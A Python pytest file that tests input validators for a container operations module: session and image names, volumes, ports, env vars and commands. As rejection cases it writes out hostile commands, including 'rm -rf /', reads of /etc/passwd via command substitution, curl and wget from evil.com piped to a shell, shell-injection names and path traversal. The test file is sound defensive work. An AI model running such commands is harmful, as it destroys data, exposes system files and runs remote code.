"""Tests for the kstlib.ops.validators module."""

from __future__ import annotations

import pytest

from kstlib.ops.validators import (
    MAX_COMMAND_LENGTH,
    MAX_ENV_KEY_LENGTH,
    MAX_ENV_VALUE_LENGTH,
    MAX_ENV_VARS,
    MAX_IMAGE_NAME_LENGTH,
    MAX_PORTS,
    MAX_SESSION_NAME_LENGTH,
    MAX_VOLUMES,
    validate_command,
    validate_env,
    validate_image_name,
    validate_ports,
    validate_session_name,
    validate_volumes,
)

# ============================================================================
# validate_session_name tests
# ============================================================================


class TestValidateSessionName:
    """Tests for validate_session_name function."""

    def test_valid_simple_name(self) -> None:
        """Accept simple alphanumeric names."""
        assert validate_session_name("mybot") == "mybot"
        assert validate_session_name("MyBot") == "MyBot"
        assert validate_session_name("a") == "a"

    def test_valid_with_underscore(self) -> None:
        """Accept names with underscores."""
        assert validate_session_name("my_bot") == "my_bot"
        assert validate_session_name("my_bot_123") == "my_bot_123"

    def test_valid_with_hyphen(self) -> None:
        """Accept names with hyphens."""
        assert validate_session_name("my-bot") == "my-bot"
        assert validate_session_name("my-bot-123") == "my-bot-123"

    def test_valid_with_numbers(self) -> None:
        """Accept names with numbers (not at start)."""
        assert validate_session_name("bot1") == "bot1"
        assert validate_session_name("mybot123") == "mybot123"

    def test_empty_name(self) -> None:
        """Reject empty names."""
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_session_name("")

    def test_too_long(self) -> None:
        """Reject names exceeding max length."""
        long_name = "a" * (MAX_SESSION_NAME_LENGTH + 1)
        with pytest.raises(ValueError, match="too long"):
            validate_session_name(long_name)

    def test_max_length_accepted(self) -> None:
        """Accept names at exactly max length."""
        name = "a" * MAX_SESSION_NAME_LENGTH
        assert validate_session_name(name) == name

    def test_starts_with_number(self) -> None:
        """Reject names starting with a number."""
        with pytest.raises(ValueError, match="must start with letter"):
            validate_session_name("1bot")

    def test_starts_with_underscore(self) -> None:
        """Reject names starting with underscore."""
        with pytest.raises(ValueError, match="must start with letter"):
            validate_session_name("_bot")

    def test_starts_with_hyphen(self) -> None:
        """Reject names starting with hyphen."""
        with pytest.raises(ValueError, match="must start with letter"):
            validate_session_name("-bot")

    def test_invalid_characters(self) -> None:
        """Reject names with invalid characters."""
        invalid_names = [
            "my bot",  # space
            "my.bot",  # dot
            "my@bot",  # at sign
            "my$bot",  # dollar sign
            "my;bot",  # semicolon (shell injection)
            "my|bot",  # pipe (shell injection)
            "my&bot",  # ampersand (shell injection)
            "my`bot",  # backtick (shell injection)
        ]
        for name in invalid_names:
            with pytest.raises(ValueError, match="must start with letter"):
                validate_session_name(name)


# ============================================================================
# validate_image_name tests
# ============================================================================


class TestValidateImageName:
    """Tests for validate_image_name function."""

    def test_valid_simple_image(self) -> None:
        """Accept simple image names."""
        assert validate_image_name("python") == "python"
        assert validate_image_name("nginx") == "nginx"

    def test_valid_with_tag(self) -> None:
        """Accept images with tags."""
        assert validate_image_name("python:3.10") == "python:3.10"
        assert validate_image_name("python:3.10-slim") == "python:3.10-slim"

    def test_valid_with_registry(self) -> None:
        """Accept images with registry path."""
        assert validate_image_name("docker.io/library/python") == "docker.io/library/python"
        assert validate_image_name("ghcr.io/user/image:tag") == "ghcr.io/user/image:tag"

    def test_valid_with_digest(self) -> None:
        """Accept images with SHA256 digest."""
        digest = "sha256:" + "a" * 64
        image = f"python@{digest}"
        assert validate_image_name(image) == image

    def test_empty_image(self) -> None:
        """Reject empty image names."""
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_image_name("")

    def test_too_long(self) -> None:
        """Reject image names exceeding max length."""
        long_name = "a" * (MAX_IMAGE_NAME_LENGTH + 1)
        with pytest.raises(ValueError, match="too long"):
            validate_image_name(long_name)

    def test_invalid_format(self) -> None:
        """Reject invalid image name formats."""
        invalid_images = [
            "Python",  # Uppercase not allowed
            "my image",  # Space
            "image;rm -rf",  # Shell injection
        ]
        for image in invalid_images:
            with pytest.raises(ValueError, match="Invalid image name"):
                validate_image_name(image)


# ============================================================================
# validate_volumes tests
# ============================================================================


class TestValidateVolumes:
    """Tests for validate_volumes function."""

    def test_valid_simple_volume(self) -> None:
        """Accept simple volume mappings."""
        assert validate_volumes(["./data:/app/data"]) == ["./data:/app/data"]
        assert validate_volumes(["/host/path:/container/path"]) == ["/host/path:/container/path"]

    def test_valid_with_mode(self) -> None:
        """Accept volumes with read-only/read-write mode."""
        assert validate_volumes(["./data:/app/data:ro"]) == ["./data:/app/data:ro"]
        assert validate_volumes(["./data:/app/data:rw"]) == ["./data:/app/data:rw"]

    def test_valid_multiple_volumes(self) -> None:
        """Accept multiple volumes."""
        volumes = ["./data:/app/data", "./logs:/app/logs:ro"]
        assert validate_volumes(volumes) == volumes

    def test_empty_list(self) -> None:
        """Accept empty volume list."""
        assert validate_volumes([]) == []

    def test_too_many_volumes(self) -> None:
        """Reject more than max volumes."""
        volumes = [f"./vol{i}:/app/vol{i}" for i in range(MAX_VOLUMES + 1)]
        with pytest.raises(ValueError, match="Too many volumes"):
            validate_volumes(volumes)

    def test_max_volumes_accepted(self) -> None:
        """Accept exactly max volumes."""
        volumes = [f"./vol{i}:/app/vol{i}" for i in range(MAX_VOLUMES)]
        assert validate_volumes(volumes) == volumes

    def test_path_traversal(self) -> None:
        """Reject volumes with path traversal."""
        with pytest.raises(ValueError, match="Path traversal"):
            validate_volumes(["../secret:/app/data"])
        with pytest.raises(ValueError, match="Path traversal"):
            validate_volumes(["./data/../../../etc:/app/data"])

    def test_invalid_format(self) -> None:
        """Reject invalid volume formats."""
        invalid_volumes = [
            ["nocontainer"],  # Missing container path
            ["host:container:invalid"],  # Invalid mode
        ]
        for volumes in invalid_volumes:
            with pytest.raises(ValueError, match="Invalid volume format"):
                validate_volumes(volumes)


# ============================================================================
# validate_ports tests
# ============================================================================


class TestValidatePorts:
    """Tests for validate_ports function."""

    def test_valid_simple_port(self) -> None:
        """Accept simple port mappings."""
        assert validate_ports(["8080:80"]) == ["8080:80"]
        assert validate_ports(["3000:3000"]) == ["3000:3000"]

    def test_valid_container_only(self) -> None:
        """Accept container-only port."""
        assert validate_ports(["80"]) == ["80"]
        assert validate_ports(["8080"]) == ["8080"]

    def test_valid_with_protocol(self) -> None:
        """Accept ports with protocol."""
        assert validate_ports(["8080:80/tcp"]) == ["8080:80/tcp"]
        assert validate_ports(["5353:53/udp"]) == ["5353:53/udp"]

    def test_valid_multiple_ports(self) -> None:
        """Accept multiple ports."""
        ports = ["8080:80", "443:443/tcp"]
        assert validate_ports(ports) == ports

    def test_empty_list(self) -> None:
        """Accept empty port list."""
        assert validate_ports([]) == []

    def test_too_many_ports(self) -> None:
        """Reject more than max ports."""
        ports = [f"{8000 + i}:80" for i in range(MAX_PORTS + 1)]
        with pytest.raises(ValueError, match="Too many ports"):
            validate_ports(ports)

    def test_max_ports_accepted(self) -> None:
        """Accept exactly max ports."""
        ports = [f"{8000 + i}:80" for i in range(MAX_PORTS)]
        assert validate_ports(ports) == ports

    def test_port_out_of_range_high(self) -> None:
        """Reject port numbers above 65535."""
        with pytest.raises(ValueError, match="out of range"):
            validate_ports(["65536:80"])
        with pytest.raises(ValueError, match="out of range"):
            validate_ports(["80:70000"])

    def test_port_out_of_range_zero(self) -> None:
        """Reject port number zero."""
        with pytest.raises(ValueError, match="out of range"):
            validate_ports(["0:80"])

    def test_invalid_format(self) -> None:
        """Reject invalid port formats."""
        invalid_ports = [
            ["abc:80"],  # Non-numeric
            ["80:80:80"],  # Too many colons
        ]
        for ports in invalid_ports:
            with pytest.raises(ValueError, match="Invalid port format"):
                validate_ports(ports)


# ============================================================================
# validate_env tests
# ============================================================================


class TestValidateEnv:
    """Tests for validate_env function."""

    def test_valid_simple_env(self) -> None:
        """Accept simple env vars."""
        assert validate_env({"APP_ENV": "production"}) == {"APP_ENV": "production"}
        assert validate_env({"LOG_LEVEL": "DEBUG"}) == {"LOG_LEVEL": "DEBUG"}

    def test_valid_multiple_env(self) -> None:
        """Accept multiple env vars."""
        env = {"APP_ENV": "production", "LOG_LEVEL": "INFO", "DEBUG": "false"}
        assert validate_env(env) == env

    def test_valid_underscore_key(self) -> None:
        """Accept keys with underscores."""
        assert validate_env({"MY_APP_CONFIG": "value"}) == {"MY_APP_CONFIG": "value"}

    def test_empty_dict(self) -> None:
        """Accept empty env dict."""
        assert validate_env({}) == {}

    def test_too_many_env_vars(self) -> None:
        """Reject more than max env vars."""
        env = {f"VAR_{i}": f"value_{i}" for i in range(MAX_ENV_VARS + 1)}
        with pytest.raises(ValueError, match="Too many env vars"):
            validate_env(env)

    def test_max_env_vars_accepted(self) -> None:
        """Accept exactly max env vars."""
        env = {f"VAR_{i}": f"value_{i}" for i in range(MAX_ENV_VARS)}
        assert validate_env(env) == env

    def test_key_too_long(self) -> None:
        """Reject keys exceeding max length."""
        long_key = "A" * (MAX_ENV_KEY_LENGTH + 1)
        with pytest.raises(ValueError, match="key too long"):
            validate_env({long_key: "value"})

    def test_value_too_long(self) -> None:
        """Reject values exceeding max length."""
        long_value = "x" * (MAX_ENV_VALUE_LENGTH + 1)
        with pytest.raises(ValueError, match="value too long"):
            validate_env({"KEY": long_value})

    def test_invalid_key_format(self) -> None:
        """Reject invalid key formats."""
        invalid_keys = [
            {"1START": "value"},  # Starts with number
            {"MY-VAR": "value"},  # Hyphen not allowed
            {"MY VAR": "value"},  # Space not allowed
            {"MY.VAR": "value"},  # Dot not allowed
        ]
        for env in invalid_keys:
            with pytest.raises(ValueError, match="Invalid env key"):
                validate_env(env)


# ============================================================================
# validate_command tests
# ============================================================================


class TestValidateCommand:
    """Tests for validate_command function."""

    def test_valid_simple_command(self) -> None:
        """Accept simple commands."""
        assert validate_command("python app.py") == "python app.py"
        assert validate_command("python -m mybot.main") == "python -m mybot.main"

    def test_valid_with_args(self) -> None:
        """Accept commands with arguments."""
        cmd = "python -m app --config /etc/app.yml --verbose"
        assert validate_command(cmd) == cmd

    def test_none_command(self) -> None:
        """Accept None command."""
        assert validate_command(None) is None

    def test_too_long(self) -> None:
        """Reject commands exceeding max length."""
        long_cmd = "python " + "a" * MAX_COMMAND_LENGTH
        with pytest.raises(ValueError, match="too long"):
            validate_command(long_cmd)

    def test_max_length_accepted(self) -> None:
        """Accept commands at exactly max length."""
        cmd = "a" * MAX_COMMAND_LENGTH
        assert validate_command(cmd) == cmd

    def test_dangerous_rm_rf(self) -> None:
        """Block commands with rm -rf pattern."""
        with pytest.raises(ValueError, match="dangerous"):
            validate_command("python app.py; rm -rf /")

    def test_dangerous_command_substitution(self) -> None:
        """Block commands with command substitution."""
        with pytest.raises(ValueError, match="dangerous"):
            validate_command("echo $(cat /etc/passwd)")

    def test_dangerous_backtick(self) -> None:
        """Block commands with backtick substitution."""
        with pytest.raises(ValueError, match="dangerous"):
            validate_command("echo `cat /etc/passwd`")

    def test_dangerous_pipe_to_shell(self) -> None:
        """Block commands piping to sh or bash."""
        with pytest.raises(ValueError, match="dangerous"):
            validate_command("curl http://evil.com | sh")
        with pytest.raises(ValueError, match="dangerous"):
            validate_command("wget -O - http://evil.com | bash")

    def test_safe_pipe_allowed(self) -> None:
        """Allow safe pipe operations."""
        assert validate_command("cat file | grep pattern") == "cat file | grep pattern"
        assert validate_command("python app.py | tee log.txt") == "python app.py | tee log.txt"
